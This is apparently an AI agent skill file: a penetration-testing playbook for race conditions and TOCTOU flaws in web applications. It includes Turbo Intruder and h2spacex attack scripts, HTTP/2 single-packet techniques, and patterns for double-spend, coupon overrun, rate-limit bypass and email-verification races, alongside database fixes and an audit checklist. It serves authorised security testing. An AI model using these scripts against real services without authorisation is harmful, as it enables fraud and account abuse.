---
name: race-condition
description: >-
  Race condition and TOCTOU testing for web apps. Use when testing one-time operations, concurrent HTTP abuse, rate-limit bypass, Turbo Intruder gates, HTTP/2 single-packet attacks, and CWE-362-style synchronization gaps.
---

# SKILL: Race Conditions — Testing & Exploitation Playbook

> **AI LOAD INSTRUCTION**: Treat race conditions as **authorization/state integrity** issues: non-atomic read-then-write lets multiple requests observe stale state. Prioritize **one-time** or **balance-like** operations. Combine **parallel transport** (HTTP/1.1 last-byte sync, HTTP/2 single-packet, Turbo Intruder gates) with **application evidence** (duplicate success responses, inconsistent balances, duplicate ledger rows). **Authorized testing only.**

---

## 0. QUICK START — What to Test First

| Priority | Operation class | Example paths |
|----------|-----------------|---------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once |

**First moves**: capture the state-changing request → send 20–100 copies in parallel → classify outcome.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU

```
Thread A                    Thread B
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see OK
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

### 1.2 Non-atomic read-then-write

```sql
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the check before either UPDATE commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag or cache says "not used yet" while DB already updated |
| **ORM / service** | Two instances, no distributed lock |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level |
| **API gateway** | Per-IP rate limit is check-then-increment — parallel burst passes duplicate checks |

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem)

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>

{"reward_id":"welcome_bonus"}
```

Send 20–100 copies in parallel. Success signal: HTTP 200 more than once, duplicate ledger entries.

### 2.2 Rate-limit bypass via simultaneity

Fire N parallel login attempts in one wave; compare with N sequential attempts.

### 2.3 Multi-step exploitation

Workflow: `create → pay → confirm`. Complete confirm on channel B while pay on channel A is still in-flight.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

Hold all requests blocked until every socket has sent all but the last byte, then release together.

```
Client 1: [headers + body - 1 byte] ----hold----+
Client N: [headers + body - 1 byte] ----hold----+--> flush last byte together
```

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

Multiplex several complete HTTP/2 streams and coalesce frames so they exit the NIC in **one** TCP segment. Sub-millisecond dispatch gap.

**Burp Repeater**: use **Send group (parallel)** / **single-packet attack** with HTTP/2.

---

## 5. TURBO INTRUDER TEMPLATES

### Template 1 — Same endpoint, gate release

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

Header for log correlation: `x-request: %s`

### Template 2 — Multi-endpoint, same gate

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0)
    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')
    engine.openGate('race1')
```

---

## 6. CVE-2022-4037 (GitLab)

Race condition → verified email address forgery → OAuth identity provider abuse. **CWE-362**. Demonstrated with HTTP/2 single-packet timing. Email verification, OAuth linking, and "confirm ownership" flows are high-value race targets.

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, gates |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 single-packet experimentation |
| **Burp Suite Repeater** | Send group (parallel) / single-packet attack |

---

## 8. DECISION TREE

```
                     START: state-changing API?
                                |
             NO ---------------+---------- YES
              |                            |
           stop                    one-time / balance / verify?
                                             |
                    +------------------------+------------------------+
                    |                        |                        |
              coupon-like               rate limit               multi-step
                    |                        |                        |
             parallel same req        parallel vs serial        parallel pipelines
                    |                        |                        |
             duplicate success?         limit exceeded?         state mismatch?
               /       \                  /       \                /       \
             YES       NO               YES       NO              YES      NO
              |         |                |         |               |        |
         report     try HTTP/2       report    try TI gates    report    deepen
```

Evidence checklist: (1) reproducible duplicate success under parallelism, (2) server-side artifact (two rows, wrong balance), (3) correlate with unique markers in logs.

---

## 9. HTTP/2 SINGLE-PACKET — DETAILED MECHANICS

### TCP Nagle Algorithm & Frame Coalescing

TCP Nagle buffers small writes. When HTTP/2 client writes multiple HEADERS+DATA frames without flushing, kernel merges them into one TCP segment.

```
App layer:    [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                    ↓ TCP Nagle coalescing ↓
TCP segment:  [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet
```

- `TCP_NODELAY` disabled → Nagle active → coalescing happens
- Practical limit: ~20–30 small requests per 1460-byte MSS

### Server-Side Dispatch

```
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

First-to-last dispatch gap: **< 100 μs** (vs 1–5 ms for HTTP/1.1 last-byte sync).

### h2spacex Usage

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(hostname='target.example.com', port_number=443)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon | Attack Window | Typical Pattern |
|----------------|------------|---------------|------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads uncommitted write | `SELECT balance` sees in-flight deduction |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check | `SELECT` → check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot hides concurrent inserts | `INSERT IF NOT EXISTS` without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Wrong lock scope or derivable key | `pg_advisory_lock()` with user-controlled key |

### READ COMMITTED TOCTOU Example

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;              balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

Fix: `SELECT ... FOR UPDATE` blocks Thread B until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Both threads snapshot at T0, see count()=0, both INSERT → duplicate claim
```

Fix: `UNIQUE(user_id, coupon_id)` constraint.

### Audit Checklist

```
□ What isolation level is the DB running?
□ Does hot path use SELECT ... FOR UPDATE?
□ Is check-then-act inside a single transaction?
□ Are UNIQUE constraints enforced on critical state tables?
□ Multi-instance: distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

- **Coupon**: 20 parallel `POST /api/apply-coupon {"code":"SUMMER50"}` → multiple 200s
- **Vote**: 50 parallel upvotes → count += N
- **Balance double-spend**: 2+ parallel transfers of exact balance → both succeed, balance negative
- **Inventory oversell**: 20 parallel purchases of 1-stock item → multiple orders created
- **Referral**: parallel claims from same session → bonus credited multiple times

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

```
Pattern 1: State-check + State-mutate
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state

Pattern 2: Cross-resource race
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order

Pattern 3: Auth verification + Privileged action
  Stream 1: POST /api/email/verify?token=TOKEN
  Stream 3: POST /api/account/upgrade
```

Burp: add requests to same group → "Send group (single packet)".

---

## Related

- **business-logic-vulnerabilities**: workflow, coupon abuse, and logic-first checklists.
